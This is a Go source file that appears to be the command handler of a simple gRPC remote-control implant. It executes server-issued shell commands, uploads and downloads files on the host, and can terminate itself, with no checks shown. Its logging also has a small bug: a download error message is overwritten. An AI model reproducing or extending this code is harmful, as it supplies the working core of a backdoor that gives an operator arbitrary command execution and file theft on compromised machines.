package main

import (
	"fmt"
	"os"
	pb "simpleGRPC/proto_defs/common"
	"strings"
)

func OrderHandler(order *pb.ServerOrder) (string, []byte) {

	var stringOutput string = ""
	var binOutput []byte = nil

	if order.In.Text == "" {
		return stringOutput, binOutput
	}

	cmd := strings.Fields(order.In.Text)[0]

	binArg := order.In.Binary

	switch cmd {
	case "shell":
		cmdArgs := strings.Join(strings.Fields(order.In.Text)[1:], " ")
		stringOutput = RunShellCmd(cmdArgs)
	case "upload":
		stringOutput = Upload(strings.Fields(order.In.Text)[1], binArg)
	case "download":
		data, err := Download(strings.Fields(order.In.Text)[1])
		if err != nil {
			stringOutput = fmt.Sprintf("[-] Error downloading file: %v", err)
		}
		stringOutput = "download"
		binOutput = data

	case "exit":
		os.Exit(0)
	default:
		stringOutput = "[-] Invalid Command"
		binOutput = nil
	}

	return stringOutput, binOutput
}
